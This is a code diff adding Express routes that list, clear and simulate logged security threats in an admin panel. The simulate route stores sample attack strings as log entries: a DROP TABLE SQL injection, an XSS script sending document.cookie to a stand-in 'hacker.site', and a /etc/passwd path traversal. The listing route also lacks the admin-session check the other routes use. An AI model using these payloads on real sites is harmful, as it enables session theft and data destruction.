@@ -43,6 +43,8 @@ const {
   healIpLocationInDb,
   listWebUserActions,
   clearWebUserActions,
+  listSecurityThreats,
+  clearSecurityThreats,
 } = require("../services/userActivityStore");
 const { getRequestContext, lookupPublicIpLocation } = require("../services/userActivityContext");
 
@@ -562,6 +564,82 @@ router.delete("/user-actions", requireActivityDatabase, requireActiveAdminSessio
   } catch (error) {
     console.error("Failed to clear user actions:", error?.message || "unknown");
     return res.status(500).json({ success: false, error: "Lỗi khi xóa lịch sử hoạt động" });
+  }
+});
+
+router.get("/security-threats", requireActivityDatabase, async (req, res) => {
+  res.setHeader("Cache-Control", "no-store, max-age=0");
+  try {
+    const limit = Math.min(Math.max(Number.parseInt(req.query.limit, 10) || 150, 1), 300);
+    const offset = Math.max(Number.parseInt(req.query.offset, 10) || 0, 0);
+    const search = String(req.query.search || "").trim();
+    const threatType = String(req.query.threatType || "").trim();
+    const severity = String(req.query.severity || "").trim();
+
+    const result = await listSecurityThreats({ threatType, severity, search, limit, offset });
+    return res.status(200).json({ success: true, threats: result.threats, total: result.total });
+  } catch (error) {
+    console.error("Failed to list security threats:", error?.message || "unknown");
+    return res.status(500).json({ success: false, error: "Không thể tải dữ liệu cảnh báo tường lửa bảo mật" });
+  }
+});
+
+router.post("/security-threats/simulate-test", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
+  try {
+    const { threatType = "SQL_INJECTION" } = req.body;
+    const ip = req.headers["cf-connecting-ip"] || req.headers["x-real-ip"] || req.socket?.remoteAddress || "127.0.0.1";
+    let details = "Phát hiện tải trọng tấn công thử nghiệm từ Admin Pen-Test Sandbox";
+    let severity = "CRITICAL";
+    let sample = "' OR 1=1; DROP TABLE users; --";
+
+    if (threatType === "XSS_INJECTION") {
+      sample = "<script>fetch('http://hacker.site?cookie='+document.cookie)</script>";
+      details = "Phát hiện mã độc XSS cố gắng đánh cắp phiên đăng nhập và Token";
+      severity = "CRITICAL";
+    } else if (threatType === "DDOS_RATE_FLOOD") {
+      sample = "GET /api/moment/feed x350 requests / 10s";
+      details = "Tần suất truy cập bất thường lặp đi lặp lại từ một nguồn IP (>300 req/phút)";
+      severity = "HIGH";
+    } else if (threatType === "AUTOMATED_SCRAPER_BOT") {
+      sample = "User-Agent: python-requests/2.31.0 Scraper-Bot";
+      details = "Robot cào dữ liệu tự động bị hệ thống tường lửa bẻ khóa và chặn tải xuống";
+      severity = "MEDIUM";
+    } else if (threatType === "PATH_TRAVERSAL") {
+      sample = "GET /../../../../etc/passwd";
+      details = "Phát hiện ý đồ truy cập trái phép tệp tin hệ thống máy chủ (Path Traversal)";
+      severity = "CRITICAL";
+    }
+
+    await require("../services/userActivityStore").recordSecurityThreat({
+      threatType,
+      severity,
+      targetEndpoint: "/api/locket/feed",
+      attackerIp: ip,
+      userUid: "PEN_TEST_SIMULATOR",
+      userEmail: req.headers["x-user-email"] || "admin-tester@huy-locket.net",
+      userAgent: req.headers["user-agent"] || "Antigravity Pen-Test Security Tool/2.0",
+      details,
+      payloadSample: sample,
+      status: "BLOCKED",
+    });
+    
+    await audit(req, "SIMULATE_SECURITY_THREAT", threatType, `Simulated security threat test: ${threatType}`);
+    return res.status(200).json({ success: true, message: `Đã mô phỏng phát hiện và chặn thành công tấn công ${threatType}!` });
+  } catch (err) {
+    console.error("Failed to simulate security threat:", err?.message || "unknown");
+    return res.status(500).json({ success: false, error: "Lỗi khi chạy thử nghiệm tấn công" });
+  }
+});
+
+router.delete("/security-threats", requireActivityDatabase, requireActiveAdminSession, async (req, res) => {
+  try {
+    const id = String(req.query.id || "ALL").trim();
+    await clearSecurityThreats(id);
+    await audit(req, "CLEAR_SECURITY_THREATS", id, `Cleared security threats log for ${id}`);
+    return res.status(200).json({ success: true, message: "Đã xóa bản ghi cảnh báo tấn công bảo mật!" });
+  } catch (error) {
+    console.error("Failed to clear security threats:", error?.message || "unknown");
+    return res.status(500).json({ success: false, error: "Lỗi khi xóa bản ghi tường lửa" });
   }
 });
 
